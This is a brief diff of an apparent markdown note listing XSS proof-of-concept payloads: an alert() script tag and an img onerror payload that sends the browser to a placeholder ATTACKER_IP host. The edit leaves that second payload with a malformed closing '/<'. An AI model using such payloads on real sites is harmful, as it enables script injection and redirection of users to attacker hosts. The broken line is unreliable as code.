@@ -1,6 +1,6 @@
 # PoC Payload: <script>alert('XSS');</script>
 
-# PoC Payload 2: <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/>
+# PoC Payload 2: <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/<
 
 ## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
 
